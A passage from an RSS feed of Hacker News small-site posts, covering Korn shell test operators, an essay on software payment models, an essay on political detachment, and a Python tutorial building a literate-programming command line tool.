process.</td></tr><tr><td><strong>-S</strong> <em>File</em></td><td>True, if the specified file exists and is a socket.</td></tr><tr><td><em>File1</em><strong> -nt</strong> <em>File2</em></td><td>True, if File1 exists and is newer than File2.</td></tr><tr><td><em>File1</em><strong> -ot</strong> <em>File2</em></td><td>True, if File1 exists and is older than File2.</td></tr><tr><td><em>File1</em><strong> -ef</strong> <em>File2</em></td><td>True, if File1 and File2 exist and refer to the same file.</td></tr><tr><td><em>String1</em><strong> =</strong> <em>String2</em></td><td>True, if String1 is equal to String2.</td></tr><tr><td><em>String1</em><strong> !=</strong> <em>String2</em></td><td>True, if String1 is not equal to String2.</td></tr><tr><td><em>String</em><strong> =</strong> <em>Pattern</em></td><td>True, if the specified string matches the specified pattern.</td></tr><tr><td><em>String</em><strong> !=</strong> <em>Pattern</em></td><td>True, if the specified string does not match the specified pattern.</td></tr><tr><td><em>String1</em><strong> &lt;</strong> <em>String2</em></td><td>True, if String1 comes before String2 based on the ASCII value of their characters.</td></tr><tr><td><em>String1</em><strong> &gt;</strong> <em>String2</em></td><td>True, if String1 comes after String2 based on the ASCII value of their characters.</td></tr><tr><td><em>Expression1</em><strong> -eq</strong> <em>Expression2</em></td><td>True, if Expression1 is equal to Expression2.</td></tr><tr><td><em>Expression1</em><strong> -ne</strong> <em>Expression2</em></td><td>True, if Expression1 is not equal to Expression2.</td></tr><tr><td><em>Expression1</em><strong> -lt</strong> <em>Expression2</em></td><td>True, if Expression1 is less than Expression2.</td></tr><tr><td><em>Expression1</em><strong> -gt</strong> <em>Expression2</em></td><td>True, if Expression1 is greater than Expression2.</td></tr><tr><td><em>Expression1</em><strong> -le</strong> <em>Expression2</em></td><td><br>True, if Expression1 is less than or equal to Expression2.</td></tr><tr><td><em>Expression1</em><strong> -ge</strong> <em>Expression2</em></td><td>True, if Expression1 is greater than or equal to Expression2.</td></tr></tbody></table></div></div>]]>
            </description>
            <link>http://pazikas.com/2020/11/08/korn-shell-opertators/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25027977</guid>
            <pubDate>Sun, 08 Nov 2020 18:58:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We Pay for Software]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25027907">thread link</a>) | @aberoham
<br/>
November 8, 2020 | https://adamwiggins.com/making-computers-better/pay | <a href="https://web.archive.org/web/*/https://adamwiggins.com/making-computers-better/pay">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <h3>how we pay for software</h3>

    <p>Quality software costs money to make.</p>

    <p>The tech industry has backed itself into a corner in the last couple decades by implying to users that software doesn’t cost much. Google led the charge here, by providing a series of useful and well-made applications like Gmail, Google Maps, and its core search product for free. They aren’t free, of course: users ”pay“ with their attention and personal data for advertisements.</p>

    <p>Paying with attention and personal data is probably a good trade for search and maps, maybe less so for email. But it’s not a model that fits professional and creative tools.</p>

    <p>Here are three proven models for paying for software:</p>

    <ul>
      <li><p><strong>Ad-supported software.</strong> Only really appropriate for pure-consumer products that are attention-oriented to begin with (e.g. social media). Requires huge scale since <a href="https://www.quora.com/What-is-Twitters-ARPU-average-revenue-per-user">each user is only worth a few bucks</a>. Because the user is the product rather than the customer, the user’s needs are not the priority of the business.</p></li>
      <li><p><strong>Software bundled with hardware or content.</strong> End users seem to be fine with paying directly for hardware (smartphone, laptop) or content (Netflix, Spotify). In these examples the software is a huge part of what you’re paying for—a Mac without macOS is just an overpriced PC, and Netflix without its excellent browsing and playback software is just cloud storage media stocked with MP4 files. Yet few people think of themselves as paying for macOS or Netflix’s app.</p></li>
    </ul>

    <figure>
      <img src="https://adamwiggins.com/making-computers-better/spotify-pricing.png" alt="pricing page for Spotify">

      <figcaption>
        <svg width="50" height="10" viewBox="0 0 50 10" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="50" height="10" rx="2.5" fill="#298070"></rect>
        </svg>

        <p><a href="https://www.spotify.com/us/premium/">Spotify’s pricing</a> demonstrates the common price range for individually-purchased subscriptions: $5/month on the low end, $15/month on the high end.</p>
      </figcaption>
    </figure>

    <ul>
      <li><p><strong>B2B SaaS.</strong> ”Business-to-business software-as-a-service“ is a mouthful, but represents a a beautiful, pure, and simple payment model for software. A business has a problem; a software creator offers a web-based product that solves the problem; the business purchases directly from the creator, and continues to pay as long as they have the problem and the product is good. Interests are aligned, and the no-middleman nature of the web means software creators have a direct relationship with their customers. Everybody wins. That’s why there’s so many success stories here: Slack, GitHub, Mailchimp, Atlassian, Zoom, Notion, and Carta just to name a few.</p></li>
    </ul>

    <p>I seek a world with a great diversity of lovingly-crafted software for niche audiences. But niche is not possible with ad-supported which requires huge scale to work, and hardware and content licensing have massive up-front capital costs that imply financing models not compatible with small-scale.</p>

    <p>Happily, B2B SaaS is having its <a href="https://microconf.com/">revolution for small independents</a> right now. So what’s the equivalent of that for pro creator tools like <a href="http://www.telestream.net/screenflow/overview.htm">video editing</a> or <a href="https://www.literatureandlatte.com/scrivener/overview">writing</a> or <a href="https://www.devontechnologies.com/apps/devonthink">knowledge management</a>? Can we have something as beautiful and pure as B2B SaaS but for individuals as well as businesses, and for desktop, mobile, and other native apps?</p>

    <p>And indeed there does seem to be movement toward subscription-priced prosumer products in the $5 –&nbsp;$15/month range. See
      established players like
      <a href="https://www.dropbox.com/individual/plans-comparison">Dropbox</a>,
      <a href="https://evernote.com/compare-plans">Evernote</a>,
      <a href="https://ulysses.app/get/">Ulysses</a> and
      <a href="https://www.omnigroup.com/omnifocus/buy/">OmniFocus</a>;
      plus up-and-comers like
      <a href="https://hey.com/pricing/">HEY</a>,
      <a href="https://roamresearch.com/">Roam</a>,
      <a href="https://www.descript.com/pricing">Descript</a>, and my own venture <a href="https://museapp.com/">Muse</a>.
    </p>

    <figure>
      <img src="https://adamwiggins.com/making-computers-better/calendly-pricing.png" alt="pricing for Calendly">

      <figcaption>
        <svg width="50" height="10" viewBox="0 0 50 10" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="50" height="10" rx="2.5" fill="#298070"></rect>
        </svg>

        <p><a href="https://calendly.com/pages/pricing">Calendly’s pricing</a> is similar to other prosumer products.</p>
      </figcaption>
    </figure>

    <p>As a <strike>user</strike> customer, I like the idea of finding a few great tools that empower my work and paying for them directly. That gives me confidence the product will serve my needs long-term, because I’m the customer.</p>

    <p>And this doesn’t mean a bigger budget for my tech product purchases overall: I can subtract these subscriptions from the money I previously spent on a new phone and laptop every two years, then buy new hardware a little less often. Right now I think great software is more important than hardware advances, much as I love shiny new devices.</p>

    <p>As a software creator, I love the idea of serving a niche of customers who are deeply connected with the product I’m making and get lots of value from it. It has that pure, direct, and personal relationship we see in B2B SaaS, but maybe even more initimate because these are personal tools.</p>

    <p>Ok sounds good—but now the next problem with a direct-payment model. If we’re going to make software subscriptions work, we as creators have to address the sharp edges and <a href="https://www.matthewball.vc/all/misnomers">subscription fatigue</a> people may experience maintaining a stack of software subscriptions.</p>

    <p>Individuals are cautious about recurring billing due to poorly-designed—even <a href="https://help.nytimes.com/hc/en-us/articles/360003499613-Cancel-your-subscription">borderline scammy</a>—subscription buying, renewal, and canceling experiences. The reference worst-case scenario are gym memberships or mobile phone contracts: being trapped in a recurring payment that no longer fits your needs, and being forced to navigate a customer service maze to try to downgrade or cancel.</p>

    <p>So how can we give customers a great experience with subscriptions? A few proposals:</p>

    <ul>
      <li><p>Treat the <strong>buying experience as part of your product</strong>. Make it easy for prospective customers to see what they will get; making buying easy and fun; show them love afterward, not just a ”you’re all set“ dialog and nothing else.</p></li>
    </ul>

    <figure>
      <img src="https://adamwiggins.com/making-computers-better/gumroad-pay.png" alt="paying for a product on Gumroad">

      <figcaption>
        <svg width="50" height="10" viewBox="0 0 50 10" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="50" height="10" rx="2.5" fill="#298070"></rect>
        </svg>

        <p><a href="https://gumroad.com/">Gumroad</a> offers <a href="https://gumroad.com/l/NlhpD">a great buying experience</a> with a minimum of fuss.</p>
      </figcaption>
    </figure>

    <ul>
      <li><p>Make it <strong>easy to cancel</strong> at any moment. Canceling should be as smooth as purchasing initially. For bonus points, give a refund for any unused portion of purchased time.</p></li>
      <li><p>For longer-cycle payments (e.g. annual), give <strong>heads-up notifications before payment</strong> so that users are not surprised. Direct them on how they can cancel with just a couple of clicks. You shouldn’t want any money from someone who is no longer getting value from your product.</p></li>
    </ul>

    <figure>
      <img src="https://adamwiggins.com/making-computers-better/hey-cancel.png" alt="canceling your subscription on HEY">

      <figcaption>
        <svg width="50" height="10" viewBox="0 0 50 10" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="50" height="10" rx="2.5" fill="#298070"></rect>
        </svg>

        <p>HEY makes canceling easy: just two clicks. The confirmation dialog is clear on exactly what happens next.</p>
      </figcaption>
    </figure>

    <ul>
     <li><p>Don’t lock users out of their data, even if their trial runs out or their subscription ends. Make it easy to <strong>get at their data and export</strong> for use in other places.</p></li>
      <li><p>Don’t treat lapsed or canceled subscriptions as strangers or defectors. Instead, <strong>consider them alumni and offer them your respect</strong> and maybe even some extra perks. They’ve been customers in the past, so be thankful for that. Remember they might return as a customer in the future or refer other potential customers.</p></li>
    </ul>

    <figure>
      <img src="https://adamwiggins.com/making-computers-better/slack-credit.png" alt="a credit for inactive users on Slack">

      <figcaption>
        <svg width="50" height="10" viewBox="0 0 50 10" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="50" height="10" rx="2.5" fill="#298070"></rect>
        </svg>

        <p>Slack delights and surprises with their <a href="https://slack.com/intl/en-de/help/articles/218915077-Fair-Billing-Policy">fair billing policy</a>.</p>
      </figcaption>
    </figure>

    <p>Beyond prosumer subscriptions, I’m happy to see products experimenting with models appropriate to their domain, like the ski app <a href="https://twitter.com/parrots/status/1314192830500347906">Slopes offering</a> packs of day passes; time-based notes app <a href="https://medium.com/@drewmccormack/cash-cow-revisited-4c2185e2b3d8">Agenda</a> with feature unlock based on subscription time windows; and <a href="https://www.komoot.com/product">Komoot</a> with hiking region budles for sale.</p>

    <p>One last one I find especially promising is the half-crowdfunding, half-early-purchase model that’s seen success with <a href="https://store.steampowered.com/earlyaccessfaq/?snr=1_200_200_Early+Access">video games</a>, <a href="https://www.studiobinder.com/blog/kickstarter-film-projects/">films</a>, and <a href="https://www.futurefonts.xyz/about">typefaces</a>. This blurs the distinctions between customer, investor, and donor. When you buy a Steam Early Access game you’re saying not just ”I want to purchase this product“ but also ”I believe in this product and the team behind it; I want it to exist; and I’m willing to risk a bit of my money to make that happen.“ And maybe: ”I like getting to give early feedback and influence the outcome of the finished product.“ <a href="https://wikimediafoundation.org/support/">Wikipedia with its pure patronage model</a> and <a href="https://www.are.na/roadmap">Are.na with its earnings transparency</a> are variations on this theme.</p>

    <p><strong>The world we have:</strong> Almost all software is paid for by (1) ads and selling personal data (2) bundling software with hardware or content or (3) business-purchased subscriptions. As a result, the type of software we have is limited to what will fit in those boxes.</p>

    <p><strong>The world I want:</strong> A wide diversity of funding and payment models for pure software products. Prosumer subscriptions are commonplace; users feel great about buying tools that matter to them; and they get a great experience when buying and canceling. Crowdfunding, patronage, and many other models flourish and individual products can choose the model that best fits them and their customers.</p>
  </article></div>]]>
            </description>
            <link>https://adamwiggins.com/making-computers-better/pay</link>
            <guid isPermaLink="false">hacker-news-small-sites-25027907</guid>
            <pubDate>Sun, 08 Nov 2020 18:51:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It’s OK to Not Care About Politics]]>
            </title>
            <description>
<![CDATA[
Score 34 | Comments 48 (<a href="https://news.ycombinator.com/item?id=25027906">thread link</a>) | @freediver
<br/>
November 8, 2020 | https://www.meta-nomad.net/its-ok-to-not-care-about-politics/ | <a href="https://web.archive.org/web/*/https://www.meta-nomad.net/its-ok-to-not-care-about-politics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1182">

	<!-- .entry-header -->

	
	<div>

		<p><span>During recent research into the life of Machiavelli something began to become quite clear to me. We weren’t always, universally, socially, communally or even personally, political. That is to say, it’s only recently that it’s become commonplace to declare oneself as left, right, Republican, Democrat, Labour, Conservative, Centrist, Reactionary, Socialist, Red, Blue, x-pilled, y-pilled etc. In terms of human history this way of </span><span><em><span>being</span></em></span><span> – as a political-being, or even as homo-politicus – is </span><span><em><span>extremely</span></em></span><span> new. The very idea of a left/right split/spectrum comes from where people sat during the French Revolution, when members of the National Assembly divided themselves into those in support of the king (right) and supporters of the Revolution (left). Arguably this is one and only time that the idea of a left/right spectrum has ever made sense. Since then </span><span><em><span>both</span></em></span><span> ‘directions’ signal virtue to various camps and striate one into relatively specific ways of thinking. The year we’re roughly talking about here is 1789, that’s round that all up and say – for clarity’s sake – we’ve been political ‘beings’ for just over 200 years. Once again, humans in their current evolutionary iteration have been around for 200,000 years. So we’ve had this political chip on our shoulders for roughly 0.1% of our entire lifetime. Of course, you could argue that for a large amount of that time we haven’t exactly had the infrastructure to allow for what we now commonly understand as politics or political economy, but we </span><span><em><span>have</span></em></span><span> had that for a few thousand years at least, so even going by that metric, the notion of a political-being or of a political-human is still quite new. </span></p>
<p><span>It seems to me the reason for the original (non) position, wherein man wasn’t apolitical, nor anti-political, but simply detached from the political, wasn’t due to some oppression (though some would argue otherwise)[1], nor was it really to do with any ignorance; it was largely because in relation to man’s daily life, the specific political on-goings didn’t matter to him. I would argue that this is still true, we’re just all caught up in status and popularity games. </span></p>
<p><span>The very idea that within contemporary (Western) society one could be ‘detached’ from politics seems absurd, that’s how tight of a grasp it has on our lives. A grasp which is ever-tightened by the popular rhetoric surrounding politics. Society in general seems to unconsciously believe that they now have some kind of duty to </span><span><em><span>be</span></em></span><span> political, they must be in a certain camp, they must have certain opinions on various matters, and most of all, they must </span><span><em><span>care</span></em></span><span> in a specifically political way. I’m here to say that this way of thinking and being is complete bullshit, and it slowly leads one to misery and submission. There are a lot of factors as to why someone might feel compelled to constantly </span><span><em><span>be</span></em></span><span> political, largely emanating from one’s perpetual attachment to media. The two most heinous forms of media are – of course – social and mainstream. Primarily because, once you actually begin to think about what these terms actually mean, like most things in modernity, they no longer make any sense whatsoever. Let’s begin with ‘social media’.</span></p>
<p><span>We all apparently ‘know’ what social media is, which is another way of saying we understand it. I’ll admit, I don’t really understand social media, and I never have. The basic reasons as to why it’s so popular are of course clear, on average humans quite like attention, they quite like having a say and they quite like boasting about their lives. However, I would ask this? If it wasn’t </span><span><em><span>for</span></em></span><span> social media, and its invasive societally pressuring structures, would you actually </span><span><em><span>want</span></em></span><span> to express certain opinions? Would you even have them? Would you have even thought about them? Maybe you would, maybe you wouldn’t, be honest with yourself. If no one was looking, and you had no proof anyone </span><span><em><span>had</span></em></span><span> looked, would you expend energy on the various political and social tasks you do? Ok, so this then begs the question, why the hell </span><span><em><span>do</span></em></span><span> we want to express these opinions? Well, for that you need a mainstream current which tells you the correct, conventional and confirmative way to </span><span><em><span>be.</span></em></span><span> Enter the mainstream media. Such an idea of a ‘mainstream’ is already idiotic. There can’t be such a thing because we all live in different areas of the world, within different cultures, within different families, with different values, within different contexts, and so, the job the mainstream media then is to subsume all of these alternative ways of being and differing value systems into one relatively homogenous lump, which is then there’s to mold as they wish. I’d insert here Ted Kaczynski’s ‘critique’ of ‘multiculturalism’, though it’s less a critique and more of a deconstruction. Kaczynski’s point is that there isn’t really any such thing as ‘multiculturalism’ as it’s sold to us. The overt idea is that multiple diverse cultures live amongst one another, learn from each other and share their cultures for the betterment of all. Kaczynski makes it clear that this is </span><span><em><span>not</span></em></span><span> what happens within contemporary multiculturalism, all that really happens is that every culture is subsumed into the exact same culture of middle-class consumerist aspiration, and perhaps allowed to retain any cultural aesthetic which might be deemed profitable by their new culture of consumerist aspiration. The exact same thing happens with mainstream media. One begins with a variety of views, opinions, values, outlooks, perspectives and contexts which have been grown organically, from their local surroundings and upbringing, these are then pushed through the conformity thresher of mainstream media, cherry-picked for their applicability for submission, and what’s left are deemed dangerous, archaic, bad, fascist, radical, silly, absurd, weird, not-normal, odd or perhaps just too common-sensical for them to remain.</span></p>
<p><span>Now, the </span><span><em><span>exact</span></em></span><span> same process happens with the idea of a ‘political-human’ with a few minor alterations. Much like homo-criminalis, or homo-economicus, once the suffix is assumed </span><span><em><span>a priori</span></em></span><span> as a </span><span><em><span>way</span></em></span><span> of being – man </span><span><em><span>can</span></em></span><span> be a criminal, or man </span><span><em><span>can</span></em></span><span> be economical. There’s no longer such a thing as a man detached entirely from criminality or the economy, there is only a man who is </span><span><em><span>not</span></em></span><span> a criminal, or a man who acts within the economy in a </span><span><em><span>different</span></em></span><span> way than what is preferred. The exact same thing happens with political man. Once a political-outlook, a political-perspective or a political-reality is assumed as the given reality, everything is then filtered through politics in some manner. Then there is no longer such a thing as a entirely unpolitical man, only a man who is deemed ignorant of politics, someone who is seen as turning a blind eye or as simply too lazy to investigate that which they </span><span><em><span>should</span></em></span><span> be. The language here is the problem. Foucault makes this point clear with homo-criminalis and homo-economicus, once the ontology is taken as a given, no one is </span><span><em><span>not</span></em></span><span> of it, but simply seen as not part of a certain section of it. Men are not men, they are either criminals or </span><span><em><span>not-</span></em></span><span>criminals, we are not ourselves we are either economizing or </span><span><em><span>not-</span></em></span><span>economizing, either way, we’re still tethered to a way of being we had no say in.</span></p>
<p><span>Well I’m here to say that this is complete and utter crap. If you want to go get involved in politics, then be my guest, but do NOT assume that just because I don’t care about a certain topic, opinion or perspective that I am immediately the antagonist of that position. There is a difference between a hostile apathy, in which one truly doesn’t care about the plight of others and a detachment within one simply is not involved. Of course, any </span><span><em><span>involved</span></em></span><span> are going to disagree. ‘It’s your duty!’ they will cry. ‘Do you not care about the world!’ they will shriek. ‘How can you just do nothing?’ they will plead. Actually, I am doing something, I’m not expending my energy on a status game which largely exists to inflate various egos and create jobs. Lest we forget that politicians are </span><span><em><span>workers</span></em></span><span>, to be a politician is a </span><span><em><span>job</span></em></span><span>, and by the looks of it, quite a cushy one at that. </span></p>
<p><span>Being </span><span><em><span>detached</span></em></span><span> from politics isn’t </span><span><em><span>not caring</span></em></span><span> about those things you left behind, in fact, it’s arguably the opposite. As soon as a charitable organization, a communal effort or a group event becomes politicized, I am instantly skeptical of its agenda, why? Well, because since when did helping others, loving thy neighbor or creating something helpful </span><span><em><span>have</span></em></span><span> to be seen through a political lens. Call me a soppy-sod, but buying a homeless person some food, donating to a local charity or helping out in a local event isn’t – and doesn’t have to be – a specifically political move or motivation, and if it is, you’re doing so to cater to your own narcissism. What </span><span><em><span>are</span></em></span><span> these acts then? Well, they are what they are. You help someone because they need help, you do something because it needs doing, you create because something needs creating; once sincere acts are filtered through the malicious gauze of politics they are usually lost entirely, abused into a self-congratulatory mutation. </span></p>
<p><span>Ok, maybe you’re with me, but you’re starting to think…’Ok, so what do I…</span><span><em><span>do?</span></em></span><span>‘ Isn’t that the point? Up until now, for many people, each and every act they undertook was done primarily from a political position as opposed to the multitude of other (healthier) perspectives that exist. What do you do? Do what you’d like and what you understand to be right. </span></p>
<p><span>“Ah yes Meta, but if we ‘do nothing’ as you propose, wont we be simply bolstering support for whichever party is in the running to win?” You’re still thinking politically, why does it </span><span><em><span>actually</span></em></span><span> matter to you? If I support X I’ve entered into a system which is so unfathomably corrupt, confused and rife with personality that I will never </span><span><em><span>truly</span></em></span><span> know what it is my vote is doing. It is NOT an apathy, an ignorance or a superiority. It is a detachment. It is one unclipping themselves from a perspective they never asked for in the first place. The years upon years spent drooling …</span></p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.meta-nomad.net/its-ok-to-not-care-about-politics/">https://www.meta-nomad.net/its-ok-to-not-care-about-politics/</a></em></p>]]>
            </description>
            <link>https://www.meta-nomad.net/its-ok-to-not-care-about-politics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25027906</guid>
            <pubDate>Sun, 08 Nov 2020 18:51:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a command line tool for literate programming]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25027878">thread link</a>) | @kaunta
<br/>
November 8, 2020 | https://johnlekberg.com/blog/2020-11-08-cli-litprog.html | <a href="https://web.archive.org/web/*/https://johnlekberg.com/blog/2020-11-08-cli-litprog.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://johnlekberg.com/blog.html">Return to Blog
</a></p><p>By John Lekberg on November 08, 2020.
</p><hr>
<p>This week's Python blog post is about building a command line tool for <a href="https://en.wikipedia.org/wiki/Literate_programming">literate programming</a>.
You will learn:</p>
<ul>
<li>How to parse <a href="https://en.wikipedia.org/wiki/XML">XML</a> using Python's <a href="https://docs.python.org/3/library/xml.etree.elementtree.html">xml.etree.ElementTree</a> module.</li>
<li>How to traverse <a href="https://en.wikipedia.org/wiki/XML">XML</a> by using <a href="https://en.wikipedia.org/wiki/XPath">XPath</a> queries.</li>
<li>How to use <a href="https://en.wikipedia.org/wiki/Regular_expression">regular expressions</a> to parse macro definitions.</li>
<li>How to use string methods to normalize text.</li>
</ul>
<p><a href="https://en.wikipedia.org/wiki/Literate_programming">Literate programming</a> is a programming paradigm created by <a href="https://en.wikipedia.org/wiki/Donald_Knuth">Donald Knuth</a>.
Dr. Knuth, Professor Emeritus at Stanford University, is better known as the
creator of <a href="https://en.wikipedia.org/wiki/TeX">TeX</a> (see also <a href="https://en.wikipedia.org/wiki/LaTeX">LaTeX</a>) and the book series <a href="https://en.wikipedia.org/wiki/The_Art_of_Computer_Programming">"The Art of
Computer Programming"</a>.</p>
<p>The goal of literate programming is to allow programs to be displayed in a
narrative order -- as opposed to being limited by the constraints of a compiler
or interpreter.
Literate programming tools allow writers to use <a href="https://en.wikipedia.org/wiki/Macro_(computer_science)">macros</a> to abstract
and reorder source code to best suit the narrative.</p>
<p>There are two things to do with a literate program:</p>
<ul>
<li>You can <strong>tangle</strong> the literate program into source code -- which can then be
compiled and executed.</li>
<li>Or, you can <strong>weave</strong> the literate program into documentation -- which can be
read.</li>
</ul>

<blockquote>
<p><strong>litprog</strong></p>
</blockquote>
<pre><code>#!/usr/bin/env python3

import pathlib
import re
import sys
import xml.etree.ElementTree as ET


def MAIN():
    import argparse

    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(
        dest="mode",
        help="Weave or tangle source XML. (Required.)",
    )

    parser_weave = subparsers.add_parser(
        "weave",
        description="Weave source XML into HTML output.",
    )
    parser_weave.add_argument(
        "file", help="CommonMark XML file"
    )

    parser_tangle = subparsers.add_parser(
        "tangle",
        description="Tangle source XML into code output.",
    )
    parser_tangle.add_argument(
        "file", help="CommonMark XML file"
    )
    parser_tangle.add_argument(
        "target", help="Root macro name"
    )

    args = parser.parse_args()
    if args.mode is None:
        parser.print_help()
        sys.exit(1)
    elif args.mode == "weave":
        xml_input = pathlib.Path(args.file).read_text()
        html_output = litprog_weave(xml_input)
        print(html_output)
    elif args.mode == "tangle":
        xml_input = pathlib.Path(args.file).read_text()
        code_output = litprog_tangle(
            xml_input, root_target=args.target
        )
        print(code_output)
    else:
        raise RuntimeError(f"Unrecognized mode {mode!r}.")


macro_definition_re = re.compile(r"""(?x)
    &lt;&lt;
    (?P&lt;name&gt;[^\n&gt;]+)
    &gt;&gt;=
""")

macro_block_re = re.compile(r"""(?mx)
    ^
    (?P&lt;indent&gt;[ \t]*)
    &lt;&lt;
    (?P&lt;name&gt;[^\n&gt;]+)
    &gt;&gt;
    (?:[ \t]*)
    $
""")

macro_inline_re = re.compile(r"""(?x)
    &lt;&lt;
    (?P&lt;name&gt;[^\n&gt;]+)
    &gt;&gt;
""")


def normal_spacing(text):
    """Normalize the white space in a string."""
    return " ".join(text.split())


def litprog_weave(source_xml):
    """Weave CommonMark XML into HTML.

    source_xml -- str.
    """
    document = ET.fromstring(source_xml)
    namespace = "http://commonmark.org/xml/1.0"

    def elem_like(ppath):
        """Iterate over elements that match an XPath
        query like ".//{namespace}ppath".
        """
        return document.iterfind(
            ".//{%s}%s" % (namespace, ppath)
        )

    # NOTE: I only included the tag changes that I needed.
    # For the full Document Type Definition (DTD), see:
    # &gt; https://github.com/commonmark/commonmark-spec/blob/master/CommonMark.dtd

    # Easy tag changes.

    tag_changes = [
        ("paragraph", "p"),
        ("thematic_break", "hr"),
        ("text", "span"),
        ("code", "code"),
    ]
    for old_tag, new_tag in tag_changes:
        for elem in elem_like(old_tag):
            elem.tag = new_tag
            elem.attrib.clear()

    # Headings.

    for elem in elem_like("heading"):
        level = elem.attrib["level"]
        elem.tag = f"h{level}"
        elem.attrib.clear()

    # Code blocks.

    for elem in elem_like("code_block"):
        info = elem.attrib.get("info", "")
        code = elem.text

        elem.tag = "figure"
        elem.clear()

        match_macro = macro_definition_re.search(info)
        if match_macro:
            caption = ET.Element("figcaption")
            elem.append(caption)
            caption.text = f"Â« {normal_spacing(match_macro['name'])} Â»:"
            code = macro_inline_re.sub(
                lambda m: f"Â«{normal_spacing(m['name'])}Â»",
                code,
            )

        tag_pre = ET.Element("pre")
        elem.append(tag_pre)
        tag_code = ET.Element("code")
        tag_pre.append(tag_code)
        tag_code.text = code

    document.tag = "div"

    return ET.tostring(document).decode()


def litprog_tangle(source_xml, *, root_target):
    """Tangle CommonMark XML into source code.

    source_xml -- str.
    target -- str. Name of macro to tangle. e.g. "MAIN".
    """
    document = ET.fromstring(source_xml)
    namespace = "http://commonmark.org/xml/1.0"

    def elem_like(ppath):
        """Iterate over elements that match an XPath
        query like ".//{namespace}ppath".
        """
        return document.iterfind(
            ".//{%s}%s" % (namespace, ppath)
        )

    body = {}

    for elem in elem_like("code_block"):
        info = elem.attrib.get("info", "")

        match_macro = macro_definition_re.search(info)
        if match_macro:
            target = normal_spacing(
                match_macro["name"]
            ).casefold()
            body[target] = elem.text

    def expand(target):
        """Recursively expand a macro.

        target -- str. Macro name.
        """
        original_target = target
        target = normal_spacing(original_target).casefold()

        text = body[target]

        def expand_block(match):
            text = expand(match["name"]).rstrip()
            text = re.sub(r"(?m)^", match["indent"], text)
            return text

        def expand_inline(match):
            text = expand(match["name"]).strip()
            assert len(text.splitlines()) &lt;= 1
            return text

        text = macro_block_re.sub(expand_block, text)
        text = macro_inline_re.sub(expand_inline, text)

        return text

    return expand(root_target)


if __name__ == "__main__":
    MAIN()
</code></pre>
<blockquote>
<pre><code>$ litprog -h
</code></pre>
</blockquote>
<pre><code>usage: litprog [-h] {weave,tangle} ...

positional arguments:
  {weave,tangle}  Weave or tangle source XML. (Required.)

optional arguments:
  -h, --help      show this help message and exit
</code></pre>
<blockquote>
<pre><code>$ litprog weave -h
</code></pre>
</blockquote>
<pre><code>usage: litprog weave [-h] file

Weave source XML into HTML output.

positional arguments:
  file        CommonMark XML file

optional arguments:
  -h, --help  show this help message and exit
</code></pre>
<blockquote>
<pre><code>$ litprog tangle -h
</code></pre>
</blockquote>
<pre><code>usage: litprog tangle [-h] file target

Tangle source XML into code output.

positional arguments:
  file        CommonMark XML file
  target      Root macro name

optional arguments:
  -h, --help  show this help message and exit
</code></pre>

<p>Here is a sample literate program for <a href="https://en.wikipedia.org/wiki/Topological_sorting#Kahn's_algorithm">Khan's Algorithm</a>:</p>
<blockquote>
<p><strong>sample.markdown</strong></p>
</blockquote>
<pre><code># Topological Sort with Khan's Algorithm

``` &lt;&lt;MAIN&gt;&gt;=
&lt;&lt;imports&gt;&gt;

def khans_algorithm(*, V, E):
    &lt;&lt; init graph &gt;&gt;
    &lt;&lt; init topological order &gt;&gt;
    &lt;&lt; init source nodes &gt;&gt;
    
    while &lt;&lt; source nodes exist &gt;&gt;:
        &lt;&lt; take source node &gt;&gt;
        &lt;&lt; add node to topological order &gt;&gt;
        &lt;&lt; add neighboring source nodes &gt;&gt;
    
    if &lt;&lt; edges remain &gt;&gt;:
        raise &lt;&lt; cycle error &gt;&gt;
    else:
        return &lt;&lt; topological order &gt;&gt;
```

I initialize the graph indices from vertices `V` and edges `E`:

``` &lt;&lt; init graph &gt;&gt;=
E_idx0 = defaultdict(set)
E_idx1 = defaultdict(set)

def index(n, m):
    E_idx0[n].add(m)
    E_idx1[m].add(n)

def deindex(n, m):
    E_idx0[n].remove(m)
    E_idx1[m].remove(n)

def indegree(n):
    return len(E_idx1[n])

def outdegree(n):
    return len(E_idx0[n])

def is_source(n):
    return indegree(n) == 0

for n, m in E:
    index(n, m)
```

I use the `indegree` and `outdegree` helper functions to determine
whether any edges remain:

``` &lt;&lt; edges remain &gt;&gt;=
any((indegree(n) &gt; 0) or (outdegree(n) &gt; 0) for n in V)
```

I represent the topological order as a list:

``` &lt;&lt; topological order &gt;&gt;=
L
```

``` &lt;&lt; init topological order &gt;&gt;=
&lt;&lt; topological order &gt;&gt; = []
```

``` &lt;&lt; add node to topological order &gt;&gt;=
&lt;&lt; topological order &gt;&gt;.append(n)
```

I represent the source nodes as a set:

``` &lt;&lt; source nodes &gt;&gt;=
S
```

``` &lt;&lt; init source nodes &gt;&gt;=
&lt;&lt; source nodes &gt;&gt; = set(filter(is_source, V))
```

``` &lt;&lt; take source node &gt;&gt;=
n = &lt;&lt; source nodes &gt;&gt;.pop()
```

``` &lt;&lt; source nodes exist &gt;&gt;=
len(&lt;&lt; source nodes &gt;&gt;) &gt; 0
```

Given a node, I use the graph indices to find the
neighboring source nodes:

``` &lt;&lt; neighbors &gt;&gt;=
tuple(E_idx0[n])
```

``` &lt;&lt; add neighboring source nodes &gt;&gt;=
for m in &lt;&lt; neighbors &gt;&gt;:
    deindex(n, m)
    if is_source(m):
        &lt;&lt; source nodes &gt;&gt;.add(m)
```

